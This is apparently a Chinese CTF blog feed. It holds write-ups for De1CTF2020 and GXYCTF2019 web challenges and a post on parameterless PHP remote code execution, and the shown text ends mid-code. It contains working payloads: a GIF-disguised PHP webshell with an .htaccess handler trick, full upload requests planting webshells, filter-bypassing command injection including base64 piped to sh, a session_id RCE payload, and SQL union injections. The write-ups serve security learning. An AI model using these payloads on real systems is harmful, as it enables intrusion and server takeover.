<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;1.gif</span><br><span class="line">GIF89a</span><br><span class="line">&lt;?&#x3D;</span><br><span class="line">eval($_POST[cmd]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;.htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .gif</span><br></pre></td></tr></table></figure>

<p>然后蚁剑连接，flag在更目录下。</p>
<h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>打开题目给了源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox &#x3D; &quot;uploads&#x2F;&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if($_POST[&quot;submit&quot;])&#123;</span><br><span class="line">    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check())&#123;</span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">            die($_FILES[&quot;file&quot;][&quot;error&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $filename&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);</span><br><span class="line">            echo &quot;save in:&quot; . $sandbox.&quot;&#x2F;&quot; . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;Not Allow!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts &#x3D; array(&quot;php&quot;);</span><br><span class="line">    $ext &#x3D; explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">    $exts &#x3D; trim(end($ext));</span><br><span class="line">    $file_content &#x3D; file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line"></span><br><span class="line">    if(!preg_match(&#39;&#x2F;[a-z0-9;~^&#96;&amp;|]&#x2F;is&#39;,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(&#39;&#x2F;\.\.&#x2F;&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) &#123;</span><br><span class="line">          return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;upload&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>抓包查看是php7.2</p>
]]></content>
      <tags>
        <tag>De1CTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>无参数RCE的研究</title>
    <url>/2020/04/30/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在写一道简单的web题目时候遇到一个奇怪的正则表达式，在此记录一下</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;[^\W]+\((?R)?\)&#x2F;</span><br></pre></td></tr></table></figure>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>(?R)是递归匹配整个正则表达式，整个正则能匹配a(b(c(d()))),a(),a(b())这样的表达式，如果里面包含参赛就不能匹配到。</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'cmd'</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入参数phpinfo()；成功执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;No_Pram_Rec.php?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="/pic/151.png" alt=""></p>
<p>传入参数scandir(“.”);没有显示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;No_Pram_Rec.php?cmd&#x3D;scandir(&quot;.&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/pic/152.png" alt=""></p>
<p>也就是可以无限套函数，但是函数必须没有参数</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>在skysec师傅的博客里面介绍了几种利用手法。</p>
<h3 id="1-getenv"><a href="#1-getenv" class="headerlink" title="1. getenv()"></a>1. getenv()</h3><p>getenv()获取的结果是数组，如何获取特定的数组元素是个问题。</p>
<p>可以使用array_rand() </p>
<blockquote>
<p>从数组中取出一个或多个随机的单元，并返回随机条目的一个或多个键。 它使用了伪随机数产生算法，所以不适合密码学场景。</p>
<p>如果只取出一个，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。 取出数量如果超过 array 的长度，就会导致 <strong><code>E_WARNING</code></strong> 错误，并返回 NULL。</p>
</blockquote>
<p>一般想要的内容都是数组的值，不是数组的键名。</p>
<p>此时可以使用</p>
<p>array_flip()</p>
<blockquote>
<p>交换数组的键名和值</p>
</blockquote>
<p>相关的数组操作函数</p>
<ul>
<li><p>array_pop() 取最后一个数组</p>
</li>
<li><p>Array_values() 返回数组所有值组成的数组（键名是0，1，2，3）</p>
</li>
<li><p>array_reverse() 将数组逆序</p>
</li>
<li><p><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> – 将内部指针指向数组中的最后一个元素，并输出键值 （参考来自颖奇师傅博客）</p>
</li>
<li><p><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> – 将内部指针指向数组中的下一个元素，并输出键值</p>
</li>
<li><p><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> – 将内部指针指向数组中的上一个元素，并输出键值</p>
</li>
<li><p><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> – 将内部指针指向数组中的第一个元素，并输出键值</p>
</li>
<li><p><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> – 返回当前元素的键名和键值，并将内部指针向前移动</p>
</li>
</ul>
<h3 id="2-getallheaders"><a href="#2-getallheaders" class="headerlink" title="2.getallheaders()"></a>2.getallheaders()</h3><table>
<thead>
<tr>
<th align="left">版本</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">5.5.7</td>
<td align="left">此函数可用于 CLI server。</td>
</tr>
<tr>
<td align="left">5.4.0</td>
<td align="left">此函数可用于 FastCGI。 此前仅在PHP以 Apache 模块方式运行时支持。</td>
</tr>
<tr>
<td align="left">4.3.3</td>
<td align="left">从 PHP 4.3.3 起，也可在 Netscape/iPlanet/SunONE Web 服务器的 <a href="https://www.php.net/manual/zh/book.nsapi.php" target="_blank" rel="noopener">NSAPI 服务器模块</a>使用此函数。</td>
</tr>
<tr>
<td align="left">4.3.0</td>
<td align="left">被改名而成为 <a href="https://www.php.net/manual/zh/function.apache-request-headers.php" target="_blank" rel="noopener">apache_request_headers()</a> 的别名。因为此函数仅适用于 Apache 。</td>
</tr>
</tbody></table>
<p>此函数会返回httpheader头部形成一个数组</p>
<p>在此时可以使用自定义头部。达到rce</p>
<p><img src="/pic/153.png" alt=""></p>
<h3 id="3-get-defined-vars"><a href="#3-get-defined-vars" class="headerlink" title="3. get_defined_vars()"></a>3. get_defined_vars()</h3><p>由于部分版本的php只能在apache上运行getallheaders()才有效果。所以当getallheaders()失效时，可以采取本函数。</p>
<p><img src="/pic/155.png" alt=""></p>
<p>能返回<code>_GET</code>、<code>_POST</code>、<code>_COOKIE</code>、<code>_FILES</code>数组</p>
<p>选取<code>_GET</code>进行RCE</p>
<p><img src="/pic/156.png" alt=""></p>
<p>尝试<code>_FILES</code>数组（<code>_POST</code>、<code>_COOKIE</code>也是同样的用法）</p>
<p>通过文件名进行RCE（也可以使用MIME）</p>
<p>空格会被截断，所以需要进行编码，此处采用base64编码</p>
<p><img src="/pic/157.png" alt=""></p>
<h3 id="4-session-id"><a href="#4-session-id" class="headerlink" title="4. session_id()"></a>4. session_id()</h3><p>这里是使用<code>_COOKIE</code>数组，除了直接利用get_defined_vars()，还能利用session_id()</p>
<blockquote>
<ul>
<li><a href="https://www.php.net/manual/zh/function.session-get-cookie-params.php" target="_blank" rel="noopener">session_get_cookie_params</a> — 获取会话 cookie 参数</li>
<li><a href="https://www.php.net/manual/zh/function.session-id.php" target="_blank" rel="noopener">session_id</a> — 获取/设置当前会话 ID</li>
<li><a href="https://www.php.net/manual/zh/function.session-name.php" target="_blank" rel="noopener">session_name</a> — 读取/设置会话名称</li>
<li><a href="https://www.php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener">session_start</a> — 启动新会话或者重用现有会话</li>
</ul>
</blockquote>
<p>经过测试发现PHPSESSID允许字母和数字出现</p>
]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
      <tags>
        <tag>无参数Rec</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019-web</title>
    <url>/2020/04/26/GXYCTF2019-web/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h2><p>扫描目录发现git泄露</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;flag.php (CODE:200|SIZE:0)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;index (CODE:200|SIZE:137)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;config (CODE:200|SIZE:92)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F; (CODE:403|SIZE:571)</span><br></pre></td></tr></table></figure>

<p>使用githack复原代码得到</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二个正则不大能看懂，于是百度一下得到考点：<strong>无参数rec</strong>  skysec师傅的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a>介绍得很详细</p>
<blockquote>
<p>能执行a(b()),a()之类的函数，a(“1”),这样就不行。</p>
</blockquote>
<p>看完skysec师傅的文章后知道了第二个正则匹配的的意思</p>
<p> 第一个正则的意思payload是不能使用包含下列字符串的伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#x2F;&#x2F;,php:&#x2F;&#x2F;,phar:&#x2F;&#x2F;,filter:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>第三个也是payload不能包含下列字符串 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">et|na|info|dec|bin|hex|oct|pi|log</span><br></pre></td></tr></table></figure>

<p>使用session_id进行无参数rce，</p>
<p>过滤了et，不能使用file_get_contents,之类的函数，但是可以使用highlight_file、show_source</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>修改cookie中PHPSESSID=flag.php</p>
<p>访问即可拿到flag</p>
<h2 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h2><p>打开题目给出了<code>/?ip=</code>是命令注入 </p>
<p>过滤了空格，<code>$IFS</code>,<code>,</code>可以代替空格</p>
<p>反引号扩起来的表示取结果</p>
<p>paylaod:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS&#96;ls&#96;;</span><br></pre></td></tr></table></figure>

<p>看到了过滤源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>参考<a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html" target="_blank" rel="noopener">王叹之师傅的博客</a>还可以可以进行变量赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sunny250@QAQdeMacBook ~ % b&#x3D;asd</span><br><span class="line">sunny250@QAQdeMacBook ~ % echo $b</span><br><span class="line">asd</span><br></pre></td></tr></table></figure>

<p>于是又得到另一种payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>

<p>过滤了bash，还可以执行sh，通过编码绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>



<p>绕过空格方式（参考来之颖奇师傅的<a href="https://www.gem-love.com/ctf/516" target="_blank" rel="noopener">博客</a>）</p>
<blockquote>
<p>$IFS</p>
<p>${IFS}</p>
<p>$IFS$9</p>
<p>&lt;</p>
<p>&lt;&gt;</p>
<p>{cat,flag.php} //用逗号实现了空格功能，需要用<code>{}</code>括起来</p>
<p>%20</p>
<p>%09 </p>
</blockquote>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>题目给了提示</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span></span><br></pre></td></tr></table></figure>

<p>base32后base64解码得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure>

<p>给出了闭合方式</p>
<p>经过测试过滤了or，大写绕过。然后是常规sql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;admin&#39;union select 1,2,3#&amp;pw&#x3D;</span><br><span class="line">&#x2F;&#x2F;wrong pass!</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#39;union select 1,&#39;admin&#39;,3#&amp;pw&#x3D;</span><br><span class="line">&#x2F;&#x2F;wrong pass!</span><br></pre></td></tr></table></figure>

<p>发现直接填写密码是错误的，尝试MD5，成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#39;union select 1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;#&amp;pw&#x3D;admin</span><br><span class="line">&#x2F;&#x2F;flag&#123;db82a88f-343e-4c70-9761-a50345e1ef8c&#125;</span><br></pre></td></tr></table></figure>



<h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><p>上传.haccess,1.ww。MIME : image/jpeg</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------21225023787917569654236041647</span><br><span class="line"><span class="attribute">Content-Length</span>: 398</span><br><span class="line"><span class="attribute">Origin</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=4c25aec0ff86fd39ba68c58584a387a8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------21225023787917569654236041647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename="1.ww"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;script language="php"&gt; </span><br><span class="line"><span class="attribute">eval($_POST[cmd]);</span></span><br><span class="line"><span class="attribute">&lt;/script&gt;</span></span><br><span class="line"><span class="attribute">-----------------------------21225023787917569654236041647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------21225023787917569654236041647--</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Length</span>: 444</span><br><span class="line"><span class="attribute">Origin</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=4c25aec0ff86fd39ba68c58584a387a8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename=".htaccess"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">#define height 12</span><br><span class="line">#define width 12</span><br><span class="line">AddType application/x-httpd-php .ww</span><br><span class="line">php_value auto_append_file "1.ww"</span><br><span class="line">-----------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------4018079373823486313032354502--</span><br></pre></td></tr></table></figure>

<p>蚁剑连接即可</p>
<h2 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0"></a>BabysqliV3.0</h2><p>admin，password弱密码直接登入</p>
<p>登入后看见连接，尝试为协议读取源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;upload.php</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">	public $Filename;</span><br><span class="line">	public $cmd;</span><br><span class="line">	public $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">		$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">		@mkdir($sandbox, 0777, true);</span><br><span class="line">		if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">		$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function upload($file)&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line"></span><br><span class="line">		if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString()&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line">		&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">		return $this-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;check token 